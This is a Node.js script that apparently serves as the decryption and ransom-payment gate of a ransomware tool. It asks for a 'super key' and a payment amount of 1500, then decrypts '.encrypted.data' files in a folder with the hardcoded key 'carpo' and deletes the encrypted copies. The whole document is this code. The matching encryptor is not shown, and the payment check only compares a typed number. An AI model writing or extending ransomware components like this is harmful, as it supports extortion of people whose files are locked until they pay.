var encryptor = require('file-encryptor');
var fs = require('fs');
var path = require('path');
var readline = require('readline');

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

var superKey = '';
var payment = 0;

rl.question('Enter the super key: ', function(answer) {
  superKey = answer;
  rl.question('Enter the payment amount (1500): ', function(amount) {
    payment = parseInt(amount);
    if (superKey === 'carpo' && payment === 1500) {
      decryptFiles();
    } else {
      console.error('Invalid super key or payment amount.');

      rl.question('Your payment is invalid. Do you want to proceed? [y/n]: ', function(response) {
        if (response.toLowerCase() === 'y') {
          rl.question('Enter the payment amount (1500): ', function(newAmount) {
            payment = parseInt(newAmount);
            if (superKey === 'carpo' && payment === 1500) {
              decryptFiles();
            } else {
              console.error('Invalid super key or payment amount. Exiting program.');
              rl.close();
            }
          });
        } else {
          console.error('Exiting program.');
          rl.close();
        }
      });
    }
  });
});

function decryptFiles() {
  var key = 'carpo';
  var folderPath = 'basta folder to';

  fs.readdir(folderPath, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      rl.close();
      return;
    }

    files.forEach(function(file) {
      var inputFilePath = path.join(folderPath, file);
      var outputFilePath = path.join(folderPath, file.replace('.encrypted.data', ''));
      encryptor.decryptFile(inputFilePath, outputFilePath, key, function(err) {
        if (err) {
          console.error('Decryption failed for file', file, ':', err);
        } else {
          console.log('Decryption complete for file', file);
          fs.unlink(inputFilePath, function(err) {
            if (err) {
              console.error('Error deleting encrypted file:', err);
            } else {
              console.log('Encrypted file', file, 'deleted.');
            }
          });
        }
      });
    });

    rl.close();
  });
}
